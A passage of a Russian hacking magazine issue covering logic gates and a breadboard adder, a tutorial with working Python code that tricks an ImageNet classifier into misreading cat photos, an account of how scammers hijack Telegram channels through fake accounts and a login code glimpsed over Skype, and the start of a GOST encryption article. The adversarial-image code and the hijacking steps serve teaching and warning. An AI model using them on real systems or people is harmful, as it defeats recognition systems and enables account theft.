схемотехника, напротив, слабо зависит от окружающих условий и вообще
устойчива к шумам.


             INFO

                  Фирма Sony удачно обыграла аналоговую и циф‐
                     ровую природу сигнала в названии своих ноут‐
                        буков  VAIO. Если внимательно присмотреться
                          к их логотипу, то первые его две бук вы пов торяют
                       аналоговую форму синусоиды,  тогда как пос‐
                      ледние две представляют пару дискретных сос‐
                       тояний цифрового бита.


Так что нет ничего удивительного в том, что сегодня большая часть информа‐
ции существует именно в цифровом виде, а компьютеры оперируют исклю‐
чительно  числами  (если  точнее,  то  их  дво ичным  представлением).
Для базового понимания цифровой схемотехники не требуется особых зна‐
ний — достаточно толь ко уметь перево дить числа из десятичной формы
в двоичную и обратно.


СХЕМА НА МИЛЛИОН
Типичная цифровая схема сос тоит из входов, выходов и логических элемен‐
тов, также называемых вентилями. Сигналы пос тупа ют на входы схемы, пре‐
образуются по определенным правилам внут ри вентилей (об этом чуть ниже)
и подаются на выходы.
  В комбинационных схемах состояние сигналов на выходе зависит только
от состояния на входе. В последова тельностных схемах выход зависит
не только от входа, но еще и от внутреннего состояния схемы. В любом слу‐
чае важно понимать, что сигналы на выходе зависят от входа, не наоборот.
  В этой статье мы будем рассмат ривать только комбинационные схемы.
Они проще для понимания и наглядней. Кстати, в отечес твенной литературе
нет устоявшегося перево да для пос ледовательностных схем. Кто‐то называет
их последовательными, кто‐то предпочитает каль ку с английского язы ка
и использует термин «секвенциальные схемы»  (sequential). Раз ницы нет
никакой, но все равно учти  это, когда будешь читать допол нительные
источники.


БАЗОВЫЕ БЛОКИ
Все цифровые схемы сво дятся к нескольким стандартным логическим эле‐
ментам. Это примерно как кубики Lego в детском конс трукторе. Их можно
комбинировать, соединять друг с другом и получать новые схемы. Для каж‐
дого элемента я привел таблицу истинности — соот ветствие между входными
и выходными сигналами.
  Существуют еще диаграммы Венна, но, на мой взгляд, они совершенно
лишние и только осложня ют дело. Впрочем, если ты предпочитаешь гра‐
фическое представление, то можешь ознакомиться и с ними.


NOT





Самый  простой  вентиль,  представляет  собой  логичес кое  отрицание
и инвертирует сигнал на единс твенном входе. Так как у нас всего два воз‐
можных состояния, таблица истинности совсем крохотная. В С/C++ это опе‐
ратор !, хотя там его действие рас простра няется на любые переменные
с числовым значением, не только бинарные.
  Обрати внимание, что на рисунке выше (и на всех последу ющих) приведе‐
ны два символа для обоз начения конкретного элемента на схемах. Слева —
американский вариант (ANSI), спра ва — его европейский аналог (МЭК
и ГОСТ). Второй стандарт сейчас уже редко где применяется, и даже в рус‐
скоязычной литературе почти всегда используется графически более наг‐
лядный стандарт ANSI.


AND





Сигнал на выходе этого вентиля равен логической единице только тогда, ког‐
да на всех входах присутству ет высокий уровень. При этом количес тво входов
может быть любым — таблица истинности изменится незначительно. Кроме
того, ничто не мешает кас кадировать такие элементы, подавая выход одного
вентиля AND на вход другого.
   Традиционно таблица рисуется имен но таким образом: сперва все входы
находятся в состоянии логического ноля, а затем последовательно инверти‐
руется один из разрядов, начиная с младшего. Можно смотреть на это и с
другой стороны — как будто все входы кодиру ют какое‐то чис ло (в двоичном
представ лении) и в каждой строке мы прибавляем к нему по единичке, про‐
ходя все возможные значения.
  В С/С++ существует аж два ана лога для этого вентиля: булево И (опе‐
ратор &) и логическое И (оператор &&). Первый применяется для проверки
флагов и других операций над отдельными битами числа, тогда как второй
используется в логических выражениях.


OR





Здесь выход находится в сос тоянии логического ноля, только когда все входы
равны нулю. Остальные комбинации приводят к высокому уровню на выходе.
  Вместе AND и OR — это два основных строительных «кир пичика» цифровой
логики. Сразу возникает вопрос, как их отличать друг от друга на схемах.
Конечно, все решает практика, и со временем они запомнятся сами собой,
но можно воспользовать ся простым правилом: форма элемента со стороны
входов соответствует первой букве в английском обоз начении.
   Так, округлость вентиля OR напоминает очертания буквы O, а прямая линия
элемента AND явно позаимствована из буквы А. Звучит немного нелепо,
но главное, что это работа ет.
   Аналогично ситуации с AND для вентиля OR в язы ках программирования С/
С++ используется булево ИЛИ (оператор |) и логичес кое ИЛИ (оператор ||).


XOR





Наконец, последний из базовых элементов в нашем списке — функция
исключающе го ИЛИ (XOR). На первый взгляд его таблица истинности выглядит
странной, но легко запоминается — высокий уровень на выходе, только когда
входы отличаются друг от друга. Одна ко не все так прос то.
  В общем случае (больше двух входов) этот вентиль реализует самую
неочевидную функцию из рассмотренных: если на входах нет логических еди‐
ниц или если их количество чет ное, то на выходе ноль, в любом другом слу‐
чае — единица.
  В C/C++ это оператор ^ и с ним свя зана забавная воз можность обменять
значения двух числовых переменных без учас тия временной переменной
для промежуточного хранения (свойство самообратимости). И все в одной
строчке:


int x, y;
...
x ^= y ^= x ^= y;

Но вернемся к нашим вентилям. Иногда в их список добавляют также сочета‐
ния с NOT: NOT + AND = NAND, NOT + OR = NOR и NOT + XOR = XNOR.
При желании можешь вывести их таб лицы истиннос ти самос тоятельно, это не
составляет никакого труда.


ПРИМЕР
Настало время применить полученные знания и собрать что‐то практически
полезное. Логические операции — это, конечно, прекрасно, но хотелось бы
и работать с числами, хотя бы для раз нооб разия!
  Представим,  что наши требова ния  к безопас ности  таковы,  что мы
не можем доверять даже процессорам крупных компаний. Мы опасаемся
возможных закладок, на уровне компании — раз работчика схемы или на
уровне компании — производителя кристалла, каких‐либо гипоте тических
уязвимостей, которые могут экс плуатировать недоброжелатели, — словом,
мы опасаемся всего и сра зу. Зна чит, нуж но собрать все самостоятельно,
не доверяя никому!
  Начинать стоит именно с процессора, а если еще конкретнее, то с сум‐
матора в АЛУ. Это клю чевой блок всего компь ютера. Как если бы мы захотели
приехать в Москву и очутились бы сразу на Красной площади.


По лусумматор
Конкретизируем задачу — пусть нам надо сложить два восьмибитных положи‐
тельных зна чения друг с другом. Если использовать алгоритм сложения стол‐
биком, то это будет выглядеть примерно так.





Мы последовательно складываем цифры в каждом раз ряде, справа налево,
и получаем результат для этого разряда. При этом мы распространяем даль‐
ше перенос, если у нас возникло переполнение. Таким образом, у нас в схе‐
ме должно быть два входа (A и B) и два выхода (S и C). Составим таблицу
истинности для всех возможных комбинаций А и В.





Рассматривая по отдельности получившиеся колонки S и C, легко заметить,
каким логическим элементам они соот ветс твуют. Теперь можно представить
схему полностью.





Сумматор
Предыдущий блок носил нес колько обидное название «полусумматора».
Почему только половинка — догадать ся нет рудно, ведь здесь мы никак
не учитываем выход с предыду щего разряда. Логично пред положить, что,
комбинируя два таких бло ка, мы можем составить схему пол ного сумматора.
Это как с Землей — есть Северное и Южное полуша рия. Хотя стоп, есть же
еще Западное и Восточное...





         Вопрос, куда девали вторую Землю, оста ется открытым

Теперь,  когда мы получили возможность полноценно складывать биты
из одного разряда, мы можем пос ледователь но вычислить пол ную сумму
нашего числа, каким бы большим оно ни было. Да, вот так все прос то!


             INFO

                    Важная  характеристика  цифровой  схемы  —
                       задержка  распространения.  Схема  реагирует
                       на изменение входных сигналов не мгновенно,
                       а с некото рым запаз дыванием. То есть приходит‐
                        ся ждать какое‐то время, в течение которого сиг‐
                       нал на выходе тоже может меняться. Чем больше
                       элемен тов в схеме, тем хуже ее быстродействие.
                     На примере  с сумматором  в  такой  наив ной
                      реализации сигнал переноса должен последова‐
                         тельно пройти через все биты числа, прежде чем
                     сформируется ито говая сумма. К счастью, есть
                         хитрые  способы  обойти  такие  ограничения,
                      и один из них мы разберем ниже.



ПРАКТИКА
До этого момен та в статье была сплошь теория. Сейчас я пред лагаю зак‐
репить ее практической частью и собрать восьмибитный сумматор. Нам пот‐
ребуется пара беспаечных макетных плат, несколько DIP‐переключателей,
светодиоды для индикации, токоогра ничивающие резисторы на 10 кОм
и пара микросхем 74HC283.
  Серия 74xx включает в себя микросхемы самого раз ного назначения.
Это могут быть как сборки логических вентилей (нап ример, 74HC04 — шесть
инверторов в одном корпусе), так и полноценные АЛУ (74HC181). Помимо
комбинационных схем, там есть и пос ледова тельностные: триггеры (74НС74),
регистры (74НС373) и счетчики (74НС393).
   Чтобы ориентироваться во всем этом номенкла турном раз нообразии, я
рекомендую не скачивать документацию на каж дую микросхему в отдельнос‐
ти, а сразу найти целый спра вочник по всей серии. Например, есть справоч‐
ник Texas Instruments в PDF.


             INFO

                   В СССР и России существуют аналогичные мик‐
                       росхемы серий К155 и КР1564, для замены 74хх
                      и 74НСхх соответствен но. Большинство из них
                       совместимы по корпусам и кон тактам с зарубеж‐
                      ными, но из‐за своей редкости и высокой цены
                      они  остаются  скорее  занятной  диковинкой.
                     Для  этой  статьи  я  пытался  достать  парочку
                        интегральных схем (ИС) белорусского «Интегра‐
                         ла» (ЭКР5564ИМ6), но в наличии их не оказалось,
                       поэто му  пришлось  ограничиться  более  мас‐
                     совыми SN74HC283 все той же Texas Instruments.


Расположение выводов  у микросхемы 74HC283 можно найти на стра‐
нице 176 справочника, принципиальную схему и таблицы истинности смотри
на страницах 390–391. И хотя это сумматор всего лишь на четыре бита, тут
есть функция ускоренного переноса, а сами микросхемы можно объ еди нять,
собирая сумматоры на 8, 16 или даже 32 бит.





Хорошо видно, что схема здесь нес колько отличается от той, что мы вывели
ранее. В этом нет ничего необычного, одну и ту же функцию можно реали‐
зовать несколькими способами, и в производс тве зачастую используют тот,
который дешевле (по элементам) и лучше подходит для техпроцесса.
  При этом все равно осталось некоторое сходс тво — его можно заметить
при внимательном изучении. Например, элементы XOR от полусумматоров
располагаются непосредс твенно перед выходом для значений каждого
из разрядов.
  Кроме того, можно понять, что зна чение для переноса вычис ляется парал‐
лельно со значениями раз рядов — для этого в микросхеме и присутству ют
«лишние» элементы. Пожалуй, это самая слож ная часть в статье. Поэтому,
если у тебя возникли трудности, попробуй рассмотреть схему ускоренного
переноса отдельно — это ИС 74HC182 на странице 338 (вот она, польза
от пол ноценного справочника).


Сло жение
Теперь, когда прин цип работы микросхемы и назначение каждого ее вывода
для нас не составляет секрета, можно собирать рабочий сумматор на восемь
бит на макетных платах. Потребуется целый ворох проводов и перемы чек,
чтобы соединить все компоненты, так что главное здесь — быть вниматель‐
ным и не допускать ошибок.





Как правило, значения в АЛУ попада ют из регистров — самого быс трого типа
памяти в компьютере. Здесь же я для удобства использую пару DIP‐перек‐
лючателей (левый верхний угол), чтобы можно было легко задавать нужные
значения. По сути, это регис тры А и В нашего про токомпьютера.
  К сожалению, производитель переключателей  явно не рассчитывал
на такое применение, поэто му нумера ция битов в каж дом регис тре мало того
что начинается с единицы, так еще и идет в «неправильном» порядке, сле ва
направо! Учитывай это, когда будешь работать со схемой.
  Пара 74НС283 располагается по центру на нижней макетке, а результат
операции отображается на линии из светодиодов (правый верхний угол).
В левом нижнем углу роль источника питания выполняет преобразователь
USB — UART (другого способа подать стабиль ные 5 В я в тот момент
не нашел).
   Если схема была соб рана без оши бок, то, задавая двоичное представ‐
ление чисел на переключателях, ты сможешь наб людать значение суммы
на светодиодах. Примерно как на картинке выше.


Вы читание
Удивительно, но такую схему без каких‐либо изменений и доработок можно
использовать и для вычитания. Да, рань ше я не говорил об этом ни слова,
но такое действительно возможно. Если исполь зовать представление отри‐
цательных чисел в дополнительном коде, нам никак не нужно переопределять
операцию сложения — все будет работать на имеющемся железе.





Наверняка ты уже представляешь, как на уровне цифровой схемы из положи‐
тельного числа можно сделать отрицательное (в дополнительном коде). Дей‐
ствительно, достаточ но только к каждому биту применить опе рацию NOT,
а затем подать на вход сумматора вместе с единицей. Как видишь, подобное
представ ление неоче видно с точки зрения челове ка, но очень удобно
для реализации из набора логических вентилей.


ЗАКЛЮЧЕНИЕ
Статья подошла к концу, но цифровая схемотехника на этом отнюдь не закан‐
чивается. Скорее наоборот, только начинается! Мы рассмотрели лишь самые
простые комбинационные схемы (за исключением, может быть, ускоренного
переноса). За бортом ока зались дешифраторы, мультиплексоры, буферы
и все последовательностные схемы (они нес коль ко сложнее для понимания).
  Кроме того, можно было бы спус титься на уро вень ниже и рассказать
о том, как собирать логичес кие вентили из дискретных элементов — тран‐
зисторов, диодов и резисторов. В раз ные времена для этого использовали
разные технологии — ТТЛ (транзисторно‐транзисторная логика), КМОП (ком‐
плиментарный металл‐оксид‐полупроводник) и дру гие, в зависимости от раз‐
вития промышленности.
  Конечно, собранная самос тоятельно на макетке схема с точки зрения
производительности навсегда оста нет ся на уровне решений семидесятых
годов прошлого века. И она никогда не сможет соперничать с современными
многоядерными процессорами, с их многоуровневым кешем, блоками спе‐
кулятивных вычислений и параллелиз мом.
  С другой стороны, важно понимать, что основные принципы работы
компьютеров не сильно изменились с тех пор. За исключением разве что
квантовых машин, но это совсем другая история. Интерес но, сможем ли мы
когда‐нибудь собирать квантовые компь юте ры так же просто, как сейчас
на основе полупроводниковых микросхем?
ТРЮКИ
 ИСХОДНЫЙ
    КОТ





               КАК ЗАСТАВИТЬ
            НЕЙРОННУЮ СЕТЬ
            ОШИБИТЬСЯ
                 Михаил Киреев
                    kireevmp@yandex.ru





Нейросети теперь повсюду, и распознавание объектов
на картинках — это одно из самых популярных применений.
Но что, если ты не хочешь, что бы объекты на твоей картинке
распознали? Или, например, хотел бы, чтобы нейросеть
«увидела» что‐то, что не увидит человек, глядя на ту же кар‐
тинку? Для этого придума ны обманные методы, которые
обращают  нейросети  про тив  них  самих. И  благодаря
готовым библиотекам пользоваться ими легче легкого.


ПОДОПЫТНАЯ НЕЙРОСЕТЬ
Для исследования нам нужна подопытная нейронная сеть, которую можно
будет препарировать. Для этого подойдет ImageRes50v2, одна из самых
передовых  сетей  для  клас сификации  изоб ражений,  натренированная
на датасете ImageNet.
  Код будем писать на Python 3 — для работы с нейросетями это фактичес‐
ки стандарт. На наше везение, модуль keras включает в себя заранее обу‐
ченную модель, которую мы и используем.
  Для начала установим все самые свежие биб лиотеки. В реестре pypi
недостаточно моделей нейросетей, в отличие от репозитория на GitHub.


$ pip3 install ‐U git+https://github.com/keras‐team/keras.git
$ pip3 install ‐U git+https://github.com/keras‐team/keras‐applic
ations.git

Теперь давай возьмем любое изображение и попробуем распознать его.





                        Исходный кот


import numpy as np
from keras.preprocessing import image
from keras.applications import resnet_v2


# Загружаем предобученную модель
model = resnet_v2.ResNet50V2(include_top=True,
                             weights='imagenet',
                             input_shape=(224, 224, 3))


# Загружаем изображение
img = image.load_img("kitten.jpg", target_size=(224, 224))
input_image = image.img_to_array(img, 'channels_last')


# Перевод изображения из формата [0; 255] в [‐1; 1]
input_image = (input_image / 255 ‐ 0.5) * 2


# Делаем из изображения массив с изображением (batch)
input_image = np.expand_dims(input_image, axis=0)
# Прогоним через нейронную сеть
predictions = model.predict(input_image)


# Переведем ответ нейронной сети (вектор) в категорию
predicted_classes = resnet_v2.decode_predictions(predictions, top=1)
imagenet_id, name, confidence = predicted_classes[0][0]
print("Я на {:.4}% уверен, что это ‐ {}!".format(confidence * 100,
name))

В результате программа ска жет нам, что это кот.


$ python3 test.py
Using TensorFlow backend.
Я на 99.51% уверен, что это ‐ Persian_cat!

Картинка взята из датасета, поэто му высокая точность не удивляет. Давай
разбираться, как именно мож но обмануть столь хорошо подготовленную ней‐
росеть.


ПРИНЦИП СОЗДАНИЯ ПОДДЕЛЬНОГО ИЗОБРАЖЕНИЯ
При создании ложных изображений главное ору жие ней ронных сетей исполь‐
зуют против них самих. Все нейронные сети — это большие математические
функции, и, чтобы найти ложное изоб ражение, разумно использовать их же.
Так что наша задача сводится к оптимиза ции методом градиентного спуска.
  Математика такой ата ки до неприличия проста: мы выворачиваем процесс
обучения нейрон ной сети наизнанку. Вместо фиксированных входных данных
(тренировочного датасета) и обучающейся сети тут мы имеем меня ющиеся,
«обучающиеся» входные данные и фиксированную сеть.
   Как и для обучения нейронной сети, нам нуж но два параметра: функция
потерь (способ подсчитать ошиб ку) и гра диент (мы используем производную
нейронной сети).
  И градиент, и ошибку мы можем пос читать, используя алгоритм обратного
распространения, прос то приняв все веса ней ронной сети правильными (и,
соответственно, неизменными), а вход — оши бочным и подлежащим исправ‐
лению.


Виды атаки
Поиски ошибочно распозна ваемого примера мож но поделить на два раз ных
вида: ненаправлен ную ата ку,  когда ищется любой подходящий пример
(необязательно име ющий смысл), и специаль но направленную атаку, цель
которой — создать минимально измененный оши бочный пример, глядя
на который человек рас позна ет объект без проблем, а программа — нет.
  Самый большой минус ненаправлен ной ата ки — это пол ное отсутс твие
у результата какой‐либо смысловой нагрузки для человека. Но преиму щество
такой атаки — возможность легко применять в реальном мире. Например,
через видеокамеры устройств IoT или систем безопасности: достаточно рас‐
печатать результат на бумажке и поднести к объ екти ву.


Простая реализация
Куда полезнее будет разобрать ся, как мож но подделать настоящее изоб‐
ражение. Для это го программе нужно сделать нес колько шагов:
 1. Загрузить модель.
 2. Описать функцию потерь.
 3. Посчитать ошибку и гра диент на входе нейросети.
 4. Изменить изображение соответс твенно градиенту (то есть улучшить его).
 5. Повторять пункты 3 и 4, пока результат не ста нет удовлетворительным.

Для этого предназначен следующий скрипт, который позволит тебе за нес‐
колько минут (при наличии достойного гра фического процессора) создать
ошибочно  распознаваемое  изображение  необходимого  класса  (у  нас
из кота — пеликана).


import numpy as np
from keras.preprocessing import image
from keras.applications import resnet_v2
from keras import backend as K


# Класс № 144 — pelican
target = 144
# Скорость обучения
learning_rate = 0.4


# Загружаем предобученную модель ResNet50v2
model = resnet_v2.ResNet50V2(include_top=True,
                             weights='imagenet',
                             input_shape=(224, 224, 3))
# Сохраняем вход и выход сети
model_input = model.layers[0].input
model_output = model.layers[‐1].output


# Загружаем изображение
img = image.load_img("kitten.jpg", target_size=(224, 224))
original_image = image.img_to_array(img, 'channels_last')


# Перевод изображения из формата [0; 255] в [‐1; 1]
original_image = (original_image/255 ‐ 0.5) * 2
# Делаем из изображения массив с изображением (batch)
original_image = np.expand_dims(original_image, axis=0)


# Функция потерь
cost_function = model_output[0, target]
# Получаем функцию, которая считает градиент на входе сети (то есть
для нашего изображения)
gradient = K.gradients(cost_function, model_input)[0]


# Создаем функцию, рассчитывающую градиент и ошибку
get_parameters = K.function([model_input, K.learning_phase()], [
cost_function, gradient])


cost = 0.0
# Улучшаем изображение, пока оно не убедит нейронную сеть как
минимум на 80%
while cost < 0.8:
    # Считаем параметры изменения
    cost, gradients = get_parameters([original_image, 0])


    # Изменим изображение, при этом убедившись, что оно все еще
правильное
    original_image += gradients * learning_rate
    original_image = np.clip(original_image, ‐1.0, 1.0)


    print("Я на {:.5f}% уверен, что котенок ‐ это пеликан".format(
cost * 100))


# Возвращаем картинку в удобоваримый вид
img = (original_image[0] / 2 + 0.5) * 255


# Сохраним!
im = Image.fromarray(img.astype(np.uint8))
im.save("pelikan.png")


АВТОМАТИЗАЦИЯ ПРОЦЕССА
Помимо такого способа обмана нейросети, ученые придумали еще очень
много разных подходов, чтобы оста вить искусс твенный интеллект в дураках.
Именно поэтому была соз дана универсальная биб лиоте ка foolbox, которая
автоматизирует все шаги, необходимые для соз дания под дельной картинки.
Давай скачаем и исполь зуем ее!


$ pip3 install ‐‐pre foolbox

Выберем другое изоб ражение, в котором нейросеть будет еще уверенней.
Например, другой кот, тоже персидский.





                  Кот, которо му не терпится стать лягушкой


$ python3 test.py
Using TensorFlow backend.
Я на 100.00% уверен, что это ‐ Persian_cat!

Сначала нужно загрузить модель, затем выб рать необходимую цель (нужную
категорию), выбрать ата ку и запустить ее.


import foolbox
import numpy as np
from keras.applications import resnet_v2
from keras import backend as K
from keras.preprocessing import image
from PIL import Image as PILImage


# Целевой класс № 30 — bullfrog — лягушка
target = 30
# Текущий класс № 28 — Persian_cat — кот (персидский)
label = 283


# Устанавливаем режим обучения (чтобы можно было считать градиент)
K.set_learning_phase(0)
# Загружаем модель
resnetmodel = resnet_v2.ResNet50V2(include_top=True,
                                   weights='imagenet',
                                   input_shape=(224, 224, 3))


# Cоздаем модель для обмана
model = foolbox.models.KerasModel(resnetmodel, bounds=(‐1, 1))
# Загружаем оригинальное изображение
img = image.load_img("kitten2.jpg", target_size=(224, 224))
original_image = image.img_to_array(img, 'channels_last')
# Приводим его к виду [‐1; 1]
original_image = (original_image / 255 ‐ 0.5) * 2
# Описываем критерий (нашу цель)
criteria = foolbox.criteria.TargetClassProbability(target, p=0.8)
# Создаем атаку L‐BGFS‐B (подробнее: https://arxiv.org/abs/1510.
05328)
attack = foolbox.attacks.LBFGSAttack(model, criteria)
result = attack(original_image, label=label)
# Возвращаем картинку в нужный вид
result = (result * 0.5 + 0.5) * 255
img = PILImage.fromarray(result.astype('uint8'))
# Сохраняем результат
img.save('frog.png')

Получаем измененное изображение.





             Котик + шум = лягушка. Не заметили? Я тоже

Запустим для него проверку (предварительно меняем название файла
в test.py):


$ python3 test.py
Using TensorFlow backend.
Я на 87.75% уверен, что это ‐ bullfrog!

Удивительный результат, добить ся которого можно на любом настольном
компьютере за считаные секунды!
   Если хочешь проверить результат на своей машине, то используй скрипт
из начала статьи — он запустится даже без графического процессора. Вот
изображение, созданное этим алго ритмом, в формате PNG, сохрани его
и посмотри, как на самом деле работа ет обман нейросетей.





                            Кот (лягуш ка)


Атака на один пик сель
Используя схожую технологию, что и у foolbox, ученые придумали другую
атаку на нейросети, которая затрагивает лишь один пиксель. Новый алгоритм
ищет тот пиксель изоб ражения, который больше всего влияет на вывод ней‐
ронной  сети, а затем использует найденную  «точку давления»,  чтобы
поменять правильный результат на неверный.
  Для этой уязвимости есть библиотека  one‐pixel‐attack‐keras, которая
делает эксплуатацию тривиальной. Для уверенного результата необходим
не один, а несколько (три или пять) пикселей. Но качес тво этого метода и так
превзошло ожидания ученых: око ло 30% изображений было превращено
в подделки изме нением одного пикселя, а изменени ем трех — уже 80%.
  Несмотря на космические бюджеты, направленные на исследования ней‐
ронных сетей, их все можно обмануть. Мы ждем от машин желез ной логики
и безукоризненной надежности, но пока это недостижимые высоты.
  Для себя я нашел главный плюс всех уяз вимостей — я знаю, как защитить
себя в случае восстания машин.
ТРЮКИ
ОСТОРОЖНО,
МОШЕННИКИ!
КАК УГОНЯЮТ
КАНАЛЫ В TELEGRAM
И ЧТО С ЭТИМ
ДЕЛАТЬ





                                       Андрей Минаев





В июне сообщество администраторов в Telegram захлестну‐
ла волна воровс тва каналов. Акка унты мошенников раз ные,
но почерк один — покуп ка канала и предварительный созвон
в Skype. Чем новый способ отличается от прежних и как обе‐
зопасить себя? Сейчас расскажу.


Покупка и продажа каналов в Telegram — это не простой и не самый безопас‐
ный процесс. В связи с чем и продавец, и покупатель стараются быть мак‐
симально осторожными. Чаще всего сделки про водятся через зарекомен‐
довавших себя гарантов.
  Обычно заин тересованные покупатели находят продающиеся каналы
в чатах, на каналах и биржах соот ветс твующей тематики либо напрямую
пишут указанным в описании канала акка унтам с предложением о покупке.


КАК ВОРОВАЛИ РАНЬШЕ?
Методы угона существуют самые разные: подделка аккаунта гаранта, про‐
ведение сделки через фальшивого гаранта, опла та через посторонний сер‐
вис мошенника. Но во многих схемах уго на повторя ется один момент — под‐
делка аккаунта. Каким обра зом, спросишь?





          Настоящий и поддельный акка унты адми нистратора

Это два разных аккаунта администратора одно го канала. Какие отличия
в логинах ты можешь заметить? На пер вый взгляд они выглядят идентично.
Но давай сравним оба логина, приведя их к нижнему регис тру.





              Подделка логина администра тора канала

Теперь различия очевидны. Мошенник вместо строчной буквы  l указал заг‐
лавную  i. Подобный обман — с подделкой схожих символов Unicode —
используют мошенники в самых разных схемах. В нашем слу чае — при угоне
каналов.
  Например, при проведении сделки про дажи или покупки канала через
гаранта. Покупатель, он же мошенник, соз дает общий чат с продавцом
и гарантом для проведения сделки. На определенном этапе он быстро уда‐
ляет гаранта из чата и добавляет его поддельный аккаунт. Обычно это устра‐
ивают на решающем эта пе сделки, чтобы про давец с гарантом не успе ли
ничего заподозрить.
  После этого невнимательный продавец, не заметив подмены, выполняет
все требования для продажи канала, но не получа ет взамен оговоренные
деньги.
   Таким же образом подделыва ют аккаунты гарантов. Мошенник подбирает
логин зарекомендовавшего себя гаранта. Иногда мошенник  указывает
реальный логин гаранта, но в поле «О себе». В таких ситуациях обмануты ми
оказываются и продавец, и покупа тель.





                   Подделка аккаунта гаранта

Помимо этого, мошенники любят предлагать провести покупку и продажу
канала через посторонний платеж ный сервис — некий криптокошелек с при‐
емом оплаты с банковских карт и популярных платежных систем.
   Если проверить информа цию о сайте, то чаще всего оказывается, что он
создан совсем недавно и упоминаний о нем в интерне те нет. В такой схеме
может пострадать любая из сторон.
  Покупатель просто переведет деньги на посторонний сервис, а позже
обнаружит, что этот сайт больше не сущес твует. Про давец, в свою очередь,
может увидеть, что на сайте поступили деньги, и передать все права на канал
в Telegram покупателю. При попыт ке вывести деньги выяснится, что сде лать
это невозможно.
  В подобных схемах в сооб щес тве администраторов каналов фигурирова‐
ли сайты einsider.ru, sellerpay.pro и okpay.com.ru. Собственно, ни один из них
на текущий момент не доступен.
  Последний сервис OkPay как раз участвовал в обмане администратора
канала «Slang Bang! / Слэнг Бэнг!». 27 сентября 2018 года админ не смог
вывести деньги за продажу канала и понял, что сервис мошеннический. Сум‐
ма сделки составляла 1,9 миллиона руб лей.


ЧТО ЗА НОВЫЙ СПОСОБ УГОНА?
Мошенники придумали способ угона, в основе которого лежит человеческая
наивность и доверчивость. На первый взгляд схема не вызывает подозрений.
Для начала мошенник, как обычно, пишет админис тра тору канала сооб щение
с предложением купить канал. Чтобы откинуть сомнения и усыпить бдитель‐
ность администратора, зада ет ряд уточняющих вопросов. Нормальных воп‐
росов и при совер шенно чес тной сделке.
 • Какие условия переда чи канала?
 • Какие сервисы для наполнения контента использует адми нистратор?
 • Через какого гаранта будет проводиться сделка?
 • Какие источники монетизации канала использует администратор?

Затем мошенник предлага ет соз вониться в скай пе, чтобы убедиться, что про‐
давец указан в списке администра торов продава емого канала.





             Мошенник про сит соз вониться в Skype

Во время разговора зло умышленник просит показать текущий профиль адми‐
нистратора, чтобы убедиться, что он реальный, а не мошеннический. В этот
момент сам злоумышленник видит номер телефо на администратора в про‐
филе.
  Мошенник пытается авторизовать ся со сво его устройства по номеру
админа. Реальному администратору приходит пятиз начный код от Telegram
для авторизации. И этот код зло умышленник видит во время текущей тран‐
сляции в скайпе и, сле дова тельно, авторизовыва ется.
  После этого вопрос только в скорос ти. Либо реальный администратор
успеет понять, что происхо дит, закроет новый сеанс и выключит трансляцию
в Skype, либо мошенник успеет выполнить три оставшихся действия для угона
канала:
 1. Удалить всех администраторов из канала.
 2. Добавить свой мошеннический аккаунт в список администраторов.
 3. Перейти по адресу my.telegram.org/auth и уда лить аккаунт реального
  администратора.





                  Активные сеансы акка унта в Telegram

Если реальный админис тра тор не успеет среагировать, то в результате этих
действий потеряет как свой канал, так и свой аккаунт.


Кто пострадал?
Число пострадавших каналов понемногу возрастает, а мошенники регулярно
меняют аккаунты. На текущий момент в список угнанных каналов входят: fut‐
bolruonline  (80  тысяч  подписчиков),  Rasimlar57  (63  тысячи),  gifki_on
(133 тысячи), topgif_1 (38 тысяч), rasmchalaa (63 тысячи).
  В целом у таких каналов есть нес коль ко дальнейших путей развития.
 1. Обманутый администратор пла тит мошеннику выкуп и получает канал
   обратно.
 2. Мошенник перепрода ет канал или самостоятельно перестраивает его
   тематику под казино или букмекерские конторы.
 3. Канал забрасывается на время для дальнейшей перепродажи.





КАК ОБЕЗОПАСИТЬ СЕБЯ?
В Telegram поняли, что необходимо оградить своих пользовате лей от зло‐
умышленников в мессенджере. В связи с этим еще в мае вве ли метку SCAM
для соответствующих аккаунтов.





                     Мет ка SCAM в Telegram

Метка выдается по жалобам пользователей через аккаунт @notoscam после
решения модераторов Telegram. Так, например, заблокировали фейковый
аккаунт @Pr_BiIrot после сообщения от адми нистра тора.





                    От вет поддержки Antiscam

Если же речь идет о том, чтобы обезопа сить себя от нового способа угона
каналов, то основной совет (который, кстати, работает и для других сер‐
висов) — включить двухэтапную аутентификацию.
 1. Открой настрой ки Telegram.
 2. Выбери пункт «Конфиденциальность».
 3. Нажми «Настро ить двухфакторную аутентификацию».
 4. Укажи пароль, подсказку и email для восста новления.





                   Создание пароля в Telegram

В таком случае попытка угнать канал сорвалась бы после ввода пятизначного
пароля из сообщения от Telegram. Потому что следующим шагом станет ввод
облачного пароля, который знаешь только ты.
   Таким образом нескольким администра торам, которые попались на удоч‐
ку мошенников, удалось спасти себя от потери канала. Но, увы, постоянно
появляются и те, кто потерял свой канал.
КОДИНГ

  КРИПТУЕМ
 ПО-КРУПНОМУ





                                        Евгений Дроботун
                                        Постоянный автор «Хакера»




      РАЗБИРАЕМСЯ С РЕЖИМОМ
          ГАММИРОВАНИЯ
         ИЗ ГОСТ 34.13—2015





Режим гаммирования, в отличие от режима простой замены,
позволяет шифровать  сообщения  произвольной  длины
без применения операции дополнения (паддинга). При этом
исходное сообщение может быть разбито на блоки с раз‐
мером меньшим размера одного блока используемого алго‐
ритма блочного шифрования или равным ему. Сегодня мы
поговорим о том, как реализуется режим гам мирования,
и напишем все необходимые для его реализации функции.


В одной из статей, пос вященных отечес твенной криптографии, мы разоб‐
рались, как применять блочные крип тоал горит мы «Кузнечик» и «Магма»
для шифрования сооб щений, размер которых превышает раз мер одного бло‐
ка (для «Кузнечика» он составляет 16 байт, а для «Магмы» — 8 байт) с исполь‐
зованием  режима  прос той  замены  (ECB,  от  английского  Electronic
Codebook). Этот режим описан в ГОСТ 34.13—2015 «Информационная тех‐
нология. Криптографическая защита информа ции. Режимы работы блочных
шифров». Этот нор мативный документ, помимо режима прос той замены,
определяет еще несколько способов при менения блочных шифров, а имен‐
но:
 • режим гаммирования (CTR, от английского Counter);
 • режим гаммирования с обратной связью по выходу (OFB, от английского
   Output Feedback);
 • режим прос той замены с зацеплением (CBC, от английского Cipher Block
   Chaining);
 • режим гаммирования с обратной связью по шифртексту (CFB, от англий‐
   ского Cipher Feedback);
 • режим выработки имитовставки (MAC, от английского Message Authentica‐
    tion Code).

Что ж, давай разберемся, как работа ет гаммирова ние и как его применять
